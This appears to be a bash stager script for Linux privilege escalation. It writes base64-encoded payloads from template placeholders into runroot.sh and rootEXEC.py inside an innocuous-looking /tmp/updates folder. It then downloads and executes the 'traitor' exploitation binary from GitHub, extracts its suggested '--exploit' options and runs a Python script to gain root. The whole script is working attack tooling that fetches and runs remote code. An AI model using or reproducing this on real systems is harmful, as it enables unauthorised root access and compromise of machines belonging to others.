#!/bin/bash
dir1=/tmp/updates
mkdir /tmp/updates
cd $dir1


runroot={RUNROOT_BASE64}
echo $runroot | base64 -d | cat > ./runroot.sh
py={PY_BASE64}
echo $py | base64 -d | cat > ./rootEXEC.py
wget https://github.com/liamg/traitor/releases/download/v0.0.14/traitor-386 -O ./traitor
chmod +x traitor
./traitor > traitor_out.txt
cat traitor_out.txt | grep -oE '\-\-exploit \w+(:)\w+' > GTFO.txt 
chmod +x ./runroot.sh
# Use traitor in py
python rootEXEC.py